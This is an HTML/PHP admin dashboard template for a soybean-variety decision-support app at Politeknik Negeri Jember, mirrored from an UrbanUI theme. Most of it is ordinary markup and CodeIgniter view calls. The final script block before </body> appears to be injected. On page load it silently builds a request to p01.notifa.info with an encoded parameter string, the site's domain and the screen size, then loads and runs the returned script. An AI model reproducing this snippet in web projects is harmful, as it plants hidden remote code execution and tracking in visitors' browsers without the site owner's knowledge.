<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.urbanui.com/flare/template/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 03:50:36 GMT -->
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>SPK Varietas Kedelai Unggul</title>
  <!-- plugins:css -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">

  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/iconfonts/simple-line-icon/css/simple-line-icons.css">

  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/css/vendor.bundle.base.css">
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/css/vendor.bundle.addons.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/css/style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="<?php echo base_url('')?>assets/images/favicon.png" />
</head>

<body>
  <div class="container-scroller">
    <!-- partial:partials/_horizontal-navbar.html -->
    <nav class="navbar horizontal-layout col-lg-12 col-12 p-0">
      <div class="nav-top flex-grow-1">
        <div class="container d-flex flex-row h-100">
          <div class="text-center navbar-brand-wrapper d-flex align-items-top">
            <a class="navbar-brand brand-logo" href="index.html"><img src="<?php echo base_url('assets/images/new-logo1.png')?>" alt="logo"/></a>
            <a class="navbar-brand brand-logo-mini" href="index.html"><img src="<?php echo base_url('assets/images/new-logo1.png')?>" alt="logo"/></a>
          </div>
          <div class="navbar-menu-wrapper d-flex align-items-center justify-content-end">
            <ul class="navbar-nav navbar-nav-right mr-0">
              <li class="nav-item nav-profile dropdown">
                <a class="nav-link dropdown-toggle" id="notificationDropdown" href="#" data-toggle="dropdown">
                  <span class="nav-profile-text">Hello Administrator</span>
                  <img src="<?php echo base_url('assets/images/faces/face1.jpg')?>" class="rounded-circle" alt="profile"/>
                </a>
                <div class="dropdown-menu dropdown-menu-right navbar-dropdown preview-list" aria-labelledby="notificationDropdown">
                  <a class="dropdown-item py-3">
                    <p class="mb-0 font-weight-medium float-left">You have 4 new notifications
                    </p>
                    <span class="badge badge-pill badge-inverse-info float-right">View all</span>
                  </a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-inverse-success">
                        <i class="icon-exclamation mx-0"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Application Error</h6>
                      <p class="font-weight-light small-text mb-0">
                        Just now
                      </p>
                    </div>
                  </a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-inverse-warning">
                        <i class="icon-bubble mx-0"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Settings</h6>
                      <p class="font-weight-light small-text mb-0">
                        Private message
                      </p>
                    </div>
                  </a>
                  <div class="dropdown-divider"></div>
                  <a href="." class="dropdown-item preview-item">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-inverse-danger">
                        <i class="icon-logout"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <h6 class="preview-subject font-weight-normal text-dark mb-1">Keluar</h6>
                      <p class="font-weight-light small-text mb-0">
                        Log Out
                      </p>
                    </div>
                  </a>
                </div>
              </li>
            </ul>
            <button class="navbar-toggler align-self-center" type="button" data-toggle="minimize">
              <span class="icon-menu text-white"></span>
            </button>
          </div>
        </div>
      </div>
      <div class="nav-bottom">
        <div class="container">
          <!--==================================   MENU   =========================-->
          <?php $this->load->view("template/vMenu"); ?>
          <!--=====================================================================-->
        </div>
      </div>
    </nav>

    <!-- partial -->
    <div class="container-fluid page-body-wrapper">
      <div class="main-panel">
        <div class="content-wrapper">
          <!--===============================   CONTENT   =========================-->
          <?php $this->load->view($content); ?>
          <!--=====================================================================-->
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
        <footer class="footer">
          <div class="w-100 clearfix">
            <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">Template by UrbanUI</span>
            <span class="float-none float-sm-right d-block mt-1 mt-sm-0 text-center">Politeknik Negeri Jember 2019
          </div>
        </footer>
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- plugins:js -->
  <script src="<?php echo base_url('')?>assets/vendors/js/vendor.bundle.base.js"></script>
  <script src="<?php echo base_url('')?>assets/vendors/js/vendor.bundle.addons.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page-->
  <!-- End plugin js for this page-->
  <!-- inject:js -->
  <script src="<?php echo base_url('')?>assets/js/template.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <script src="<?php echo base_url('')?>assets/js/toastDemo.js"></script>
  <script src="<?php echo base_url('')?>assets/js/dashboard.js"></script>
  <script src="<?php echo base_url('')?>assets/js/todolist.js"></script>
  <!-- End custom js for this page-->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2f5piOvuQe61lJl2eL0mGY6TY3PpvjgBQq7AvcqkiX8hyAWpHJAjQGaKzW1laYF7Q2lQB4C180oL4q6m2OlRKIGgo7EjmYT7UvCLQcfVlGJQNZuTdIOdEeaRd%2bOxdPAWybcsd5xSCB8IM3SHcSkNFCOAdl8eO8F6r5wWiQax%2b%2bdfnE7FWczPJZXrKAHwvyg%2b0j2kM5ccCdAUbl5YNJsdc20TbJfK9acZtzu7r29zNbt2KH4FYJpbCzm6fjquk%2fF58IdCdE3zv1nDPQt6ekyh%2bKDU557dmtIpDRdFTnD2BMsI%2bvu%2bHimQbyiCpJ3LfnsuJtIJbXOKCDCIiyfdo3kcbXIZPh6h6VaahNvxIUSttVu92ZIKE%2fCTX%2bUd4ZEV691W1jkTUMCRk6zjKwzrEoLRK3CDqe9iTGdf8pnkL8lSMbbCXKcDWY7GeTlHwAa0ug72TPagd0asOD9P6s91IZHvD7lkTQgyv0k6nlAZ0tgt8ExhbTsK2k3FA0g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from www.urbanui.com/flare/template/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 03:53:38 GMT -->
</html>
